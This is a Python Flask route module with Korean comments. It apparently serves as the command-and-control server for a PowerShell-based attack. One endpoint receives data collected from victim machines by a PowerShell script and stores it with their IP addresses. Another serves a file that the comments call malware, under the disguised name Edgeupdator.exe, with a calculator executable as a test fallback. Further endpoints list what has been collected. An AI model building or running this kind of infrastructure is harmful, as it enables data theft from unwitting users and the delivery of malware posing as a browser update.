"""
파워쉘 전용 라우트 모듈
"""
# routes/powershell.py
from flask import Blueprint, request, jsonify, send_file
import os
import json
import logging
from datetime import datetime
import base64

powershell_bp = Blueprint('powershell', __name__)

# 파워쉘 데이터 저장 파일
POWERSHELL_DATA_FILE = 'logs/powershell_data.json'

def load_powershell_data():
    """파워쉘 데이터 로드"""
    try:
        if os.path.exists(POWERSHELL_DATA_FILE):
            with open(POWERSHELL_DATA_FILE, 'r', encoding='utf-8') as f:
                return json.load(f)
    except Exception as e:
        logging.error(f"파워쉘 데이터 로드 실패: {e}")
    return []

def save_powershell_data(data_list):
    """파워쉘 데이터 저장"""
    try:
        with open(POWERSHELL_DATA_FILE, 'w', encoding='utf-8') as f:
            json.dump(data_list, f, ensure_ascii=False, indent=2)
    except Exception as e:
        logging.error(f"파워쉘 데이터 저장 실패: {e}")

def decrypt_aes_data(encrypted_data):
    """AES 복호화 (간단 구현)"""
    try:
        # 실제로는 파워쉘과 동일한 키/IV로 복호화해야 함
        # 지금은 base64 디코딩만 시도
        decoded = base64.b64decode(encrypted_data)
        return decoded.decode('utf-8', errors='ignore')
    except Exception as e:
        logging.error(f"복호화 실패: {e}")
        return encrypted_data

@powershell_bp.route('/report', methods=['POST'])
def receive_powershell_report():
    """파워쉘에서 수집한 데이터 수신"""
    try:
        # 파워쉘에서 전송하는 형식: { data: "암호화된데이터" }
        encrypted_data = request.form.get('data')
        
        if not encrypted_data:
            return jsonify({'error': '데이터가 없습니다'}), 400
        
        # 복호화 시도
        decrypted_data = decrypt_aes_data(encrypted_data)
        
        # 클라이언트 정보 수집
        client_info = {
            'ip': request.remote_addr,
            'user_agent': request.headers.get('User-Agent', ''),
            'timestamp': datetime.now().isoformat()
        }
        
        # 데이터 저장
        data_entry = {
            'id': datetime.now().strftime('%Y%m%d_%H%M%S'),
            'encrypted_data': encrypted_data,
            'decrypted_data': decrypted_data,
            'client_info': client_info,
            'timestamp': client_info['timestamp']
        }
        
        powershell_data = load_powershell_data()
        powershell_data.append(data_entry)
        
        # 최근 100개만 유지
        powershell_data = powershell_data[-100:]
        save_powershell_data(powershell_data)
        
        # 로그 출력
        logging.info(f"📊 파워쉘 데이터 수신: {client_info['ip']} - 크기: {len(encrypted_data)} bytes")
        print(f"[PowerShell] 수신된 암호화 데이터 (처음 100자): {encrypted_data[:100]}...")
        
        return "OK", 200
        
    except Exception as e:
        logging.error(f"파워쉘 데이터 수신 오류: {e}")
        return jsonify({'error': '데이터 처리 실패'}), 500

@powershell_bp.route('/report/Edgeupdator.exe', methods=['GET'])
def serve_malicious_exe():
    """악성코드 파일 전송 (곽근진님 exe 파일)"""
    try:
        # downloads 폴더에서 악성코드 파일 찾기
        exe_path = os.path.join('downloads', 'Edgeupdator.exe')
        
        if not os.path.exists(exe_path):
            # 테스트용으로 계산기 제공 (실제로는 악성코드 파일이 있어야 함)
            calc_path = r"C:\Windows\System32\calc.exe"
            if os.path.exists(calc_path):
                logging.warning("⚠️ 실제 악성코드가 없어서 계산기로 대체")
                return send_file(calc_path, 
                               mimetype='application/octet-stream', 
                               as_attachment=True, 
                               download_name='Edgeupdator.exe')
            else:
                return jsonify({'error': '악성코드 파일을 찾을 수 없습니다'}), 404
        
        logging.info("🦠 악성코드 파일 전송")
        return send_file(exe_path, 
                        mimetype='application/octet-stream', 
                        as_attachment=True, 
                        download_name='Edgeupdator.exe')
        
    except Exception as e:
        logging.error(f"악성코드 파일 전송 오류: {e}")
        return jsonify({'error': '파일 전송 실패'}), 500

@powershell_bp.route('/api/powershell/data')
def get_powershell_data():
    """수집된 파워쉘 데이터 조회"""
    try:
        data = load_powershell_data()
        return jsonify({
            'total': len(data),
            'recent_10': data[-10:] if data else [],
            'all_data': data
        })
    except Exception as e:
        logging.error(f"파워쉘 데이터 조회 오류: {e}")
        return jsonify({'error': '데이터 조회 실패'}), 500

@powershell_bp.route('/api/powershell/data/<data_id>')
def get_powershell_data_detail(data_id):
    """특정 파워쉘 데이터 상세 조회"""
    try:
        data = load_powershell_data()
        target_data = next((item for item in data if item['id'] == data_id), None)
        
        if not target_data:
            return jsonify({'error': '데이터를 찾을 수 없습니다'}), 404
            
        return jsonify(target_data)
    except Exception as e:
        logging.error(f"파워쉘 데이터 상세 조회 오류: {e}")
        return jsonify({'error': '데이터 조회 실패'}), 500